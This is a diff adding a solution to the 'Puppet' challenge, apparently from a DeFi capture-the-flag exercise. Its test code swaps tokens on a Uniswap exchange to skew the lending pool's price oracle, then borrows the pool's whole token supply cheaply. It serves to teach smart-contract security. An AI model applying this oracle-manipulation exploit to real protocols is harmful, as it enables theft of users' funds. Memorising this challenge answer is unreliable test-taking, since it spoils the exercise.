@@ -93,6 +93,18 @@ describe('[Challenge] Puppet', function () {
 
     it('Exploit', async function () {
         /** YOUR EXPLOIT GOES HERE */
+
+        /* Approve exchange to take 2 DVTs */
+        await this.token.approve(this.uniswapExchange.address, ether('2'), {from: attacker});
+        
+        /* Swap 2 tokens to 1 Ether */
+        const deadline = (await web3.eth.getBlock('latest')).timestamp * 2;
+        await this.uniswapExchange.tokenToEthSwapInput(ether('2'), ether('1'), deadline, {from: attacker});
+
+        /* Now Ether balance of lending pool is lower that its token balance */
+        /* Exploit the vulnerability (borrow tokens and steal Ether back) */
+        await this.lendingPool.borrow(ether('10000'), {from: attacker});
+        
     });
 
     after(async function () {
